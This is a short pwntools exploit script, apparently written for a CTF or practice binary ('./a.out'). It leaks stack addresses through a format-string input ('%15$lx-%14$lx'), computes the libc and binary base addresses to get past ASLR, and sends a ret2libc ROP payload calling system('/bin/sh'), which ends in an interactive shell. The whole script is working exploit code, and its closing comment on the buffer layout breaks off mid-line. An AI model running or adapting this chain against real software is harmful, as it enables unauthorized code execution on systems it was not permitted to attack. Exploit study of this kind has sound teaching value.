#!/usr/bin/env python3
from pwn import *

executable = ELF("./a.out")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

# Base address for libc = %3$lx - 0xeef33
# Base address for binary = %14$lx - 0x1155

io = executable.process()
io.sendline('%15$lx-%14$lx')
io.recvline()
leak = io.recvline()
libc.address = int(leak.strip().split(b'-')[0], 16) - 0x268e9
executable.address = int(leak.strip().split(b'-')[1], 16) - 0x01155

log.info(f'LibC Base = {hex(libc.address)}')
log.info(f'Bin Base = {hex(executable.address)}')

payload = flat("A"*16, executable.address + 0x123b, next(libc.search(b'/bin/sh')), libc.sym['system'], executable.address + 0x123c, libc.sym['exit'], endianness='little', word_size=64, sign=False)
log.info(f'Payload = {payload.hex()}')
io.sendline(payload)
io.interactive()

# Buffer = 256 bytes -> 8 bytes for EBP -> 8 bytes for RET -> 